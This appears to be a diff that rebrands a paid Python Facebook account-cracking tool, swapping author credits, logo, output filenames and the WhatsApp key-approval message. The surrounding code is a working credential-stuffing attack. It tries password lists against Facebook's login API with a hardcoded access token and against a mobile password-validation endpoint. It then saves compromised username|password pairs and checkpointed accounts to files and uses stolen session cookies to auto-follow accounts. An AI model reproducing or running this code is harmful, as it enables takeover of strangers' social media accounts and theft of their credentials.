@@ -97,12 +97,13 @@ def jalan(z):
 # LO KONTOL
 def logo():
 	print("""%s
-               ______      _    _ _____ __  __ 
-              |  ____/\   | |  | |_   _|  \/  |
-              | |__ /  \  | |__| | | | | \  / |
-              |  __/ /\ \ |  __  | | | | |\/| |
-              | | / ____ \| |  | |_| |_| |  | |
-              |_|/_/    \_\_|  |_|_____|_|  |_|
+
+███╗░░██╗██╗███╗░░██╗░░░░░██╗░█████╗░
+████╗░██║██║████╗░██║░░░░░██║██╔══██╗
+██╔██╗██║██║██╔██╗██║░░░░░██║███████║
+██║╚████║██║██║╚████║██╗░░██║██╔══██║
+██║░╚███║██║██║░╚███║╚█████╔╝██║░░██║
+╚═╝░░╚══╝╚═╝╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝
 """%(O))
 
 def reg():
@@ -131,7 +132,7 @@ def reg():
         name = input("               YOUR NAME : ")
         input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
         time.sleep(3.5)
-        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+to
+        tks = 'Dear%20Khan,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+to
         os.system('am start https://wa.me/+923345478919?text=' + tks)
         reg()
 
@@ -148,7 +149,7 @@ def reg2():
     name = input("               YOUR NAME : ")
     input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
     time.sleep(3.5)
-    tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
+    tks = 'Dear%20Khan,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
     os.system('am start https://wa.me/+923345478919?text=' + tks)
     sav = open('/sdcard/Android/.bs7nt.txt', 'w')
     sav.write(id)
@@ -189,8 +190,8 @@ def hasil(OK,cp):
         print('\n----------------------------------------------')
         print(' Your Process Complete...')
         print('----------------------------------------------')
-        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mAdf-ok.txt'%(O,O,str(len(ok))))
-        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mAdf-cp.txt'%(O,O,str(len(cp))))
+        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mkhan-ok.txt'%(O,O,str(len(ok))))
+        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mkhan-cp.txt'%(O,O,str(len(cp))))
         print('----------------------------------------------')
         input(f"\n\033[1;97m Press Enter To Go Back ")
         bsn_menu()
@@ -200,10 +201,10 @@ def bsn_menu():
     logo()
     ipm = requests.get(url_ip).json() 
     IP = ipm["origin"]
-    print("             [*]. CREATED BY : FAHIM HOSSEN");time.sleep (0.03)
-    print("             [*]. FACEBOOK   : FAHIM HOSSEN");time.sleep (0.03)
-    print("             [*]. GITHUB     : FAHIM404-CYBER");time.sleep (0.03)   
-    print("             [*]. VERSION    : 2.5.6");time.sleep (0.03)
+    print("             [*]. CREATED BY : RIZWAN WAZIRISTANI");time.sleep (0.03)
+    print("             [*]. FACEBOOK   : Rizwan Ullah");time.sleep (0.03)
+    print("             [*]. GITHUB     : PRIVATE_BRO");time.sleep (0.03)   
+    print("             [*]. VERSION    : 0.0.1");time.sleep (0.03)
     print("             [*]. TOOL TYPE  : PAID");time.sleep (0.03)
     print("             [*]. IP ADDRESS : [%s]\n"%(IP));time.sleep(0.01)
     print("   \033[1;97m              Menu")
@@ -249,7 +250,7 @@ class __bsn__:
     def __api__(self, user, __chi__):
         global ok,cp,loop
         for i in list('\|-/'):
-            sys.stdout.write(f'\r [FAHIM] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
+            sys.stdout.write(f'\r [khan] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
             sys.stdout.flush()
         for pw in __chi__:
             pw = pw.lower()
@@ -257,10 +258,10 @@ class __bsn__:
             except: pass
             p = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
             if "access_token" in p:
-                print('\r [OK-FAHIM] %s | %s ' % (user,pw))
+                print('\r [OK-khan] %s | %s ' % (user,pw))
                 wrt = '%s|%s' % (user,pw)
                 ok.append(wrt)
-                open('fahim-ok.txt' , 'a').write('%s\n' % wrt)
+                open('khan-ok.txt' , 'a').write('%s\n' % wrt)
                 break
             elif "www.facebook.com" in p["error_msg"]:
                 try:
@@ -268,10 +269,10 @@ class __bsn__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print('\r%s \033[1;91m[CP-FAHIM] %s | %s ' % (K,user,pw))
+                    print('\r%s \033[1;91m[CP-khan] %s | %s ' % (K,user,pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('fahim-cp.txt' , 'a').write('%s\n' % wrt)
+                    open('khan-cp.txt' , 'a').write('%s\n' % wrt)
                     break
                 except (KeyError, IOError):
                     month = ''
@@ -279,10 +280,10 @@ class __bsn__:
                     year  = ''
                 except:
                     pass
-                print('\r%s \033[1;91m[CP-FAHIM] %s | %s ' % (K,user,pw))
+                print('\r%s \033[1;91m[CP-khan] %s | %s ' % (K,user,pw))
                 wrt = '%s|%s' % (user,pw)
                 cp.append(wrt)
-                open('fahim-cp.txt' , 'a').write('%s\n' % wrt)
+                open('khan-cp.txt' , 'a').write('%s\n' % wrt)
                 break
             else:
                 continue
@@ -290,7 +291,7 @@ class __bsn__:
 
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f'\r [FAHIM] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
+        sys.stdout.write(f'\r [khan] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -340,10 +341,10 @@ class __bsn__:
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f'\r{H} [OK-FAHIM] {user} | {pw}')
+                    print(f'\r{H} [OK-khan] {user} | {pw}')
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
-                    open('fahim-ok.txt' , 'a').write('%s\n' % wrt)
+                    open('khan-ok.txt' , 'a').write('%s\n' % wrt)
                     self.follow(session,coki)
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
@@ -352,20 +353,20 @@ class __bsn__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s \033[1;91m[CP-FAHIM] %s | %s ' % (K,user,pw))
+                        print('\r%s \033[1;91m[CP-khan] %s | %s ' % (K,user,pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('fahim-cp.txt' , 'a').write('%s\n' % wrt)
+                        open('khan-cp.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
                         day   = ''
                         year  = ''
                     except:pass
-                    print('\r%s \033[1;91m[CP-FAHIM] %s | %s ' % (K,user,pw))
+                    print('\r%s \033[1;91m[CP-khan] %s | %s ' % (K,user,pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('fahim-cp.txt' , 'a').write('%s\n' % wrt)
+                    open('khan-cp.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
